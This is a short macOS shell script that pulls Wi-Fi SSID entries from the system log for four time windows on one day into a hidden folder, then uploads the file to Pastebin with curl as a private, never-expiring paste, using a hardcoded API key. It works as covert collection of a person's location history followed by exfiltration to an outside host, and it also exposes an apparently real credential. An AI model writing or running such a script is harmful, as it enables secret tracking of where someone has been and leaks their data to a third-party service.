mkdir ~/.wifi_hist
touch ~/.wifi_hist/hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 09:00:00" --end "2024-08-20 09:15:00" >> ~/.wifi_hist/hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 10:50:00" --end "2024-08-20 11:10:00" >> ~/.wifi_hist/hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 12:45:00" --end "2024-08-20 13:00:00" >> ~/.wifi_hist/hist.txt
log show --predicate 'eventMessage contains " SSID "' --info --start "2024-08-20 14:50:00" --end "2024-08-20 15:05:00" >> ~/.wifi_hist/hist.txt
FILE_PATH="~/.wifi_hist/hist.txt"
FULL_PATH=$(eval echo $FILE_PATH)
curl -X POST -d 'api_dev_key=683c74cdc06c1d15c58c77ad7ee4aefb' \
     -d 'api_option=paste' \
     -d 'api_paste_code=' --data-binary "@${FILE_PATH}" \
     -d 'api_paste_private=2' \
     -d 'api_paste_name=hist.txt' \
     -d 'api_paste_expire_date=N' \
     https://pastebin.com/api/api_post.php
